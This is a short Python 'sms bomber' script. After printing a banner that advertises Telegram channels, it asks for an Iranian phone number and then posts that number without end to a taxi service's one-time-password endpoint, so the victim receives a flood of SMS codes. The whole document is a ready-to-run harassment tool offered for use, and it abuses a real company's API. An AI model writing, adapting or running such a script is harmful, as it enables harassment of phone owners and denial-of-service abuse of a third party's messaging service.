import requests
import os
red='\033[31m'
green='\033[32m'
url = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
os.system("clear")
os.system("pkg install figlet -y")
os.system("clear")
print(f"{red} ")
os.system("figlet sms bomber")
print(f"{green}===========================================")
print("  telegram channel: @VPN_Alexabot            ")
print(f"{green}===========================================")
print("[1]start")
print("[2]exit")
king = int(input("[~]Bad_boy==>"))
if king == 1:
    hacker = input("Enter phone Number (9++++++) : ")
    while True:
              requests.post(url,data={"cellphone":"+98"+hacker})
              print("sended to =>", hacker)
elif king == 2:
    os.system("clear")
    print("have nice day =) ")
#tekegram channel : @hackm_an
#made by admin channel 
#samyar and M.r jooon or Bad_boy
#good bye =)
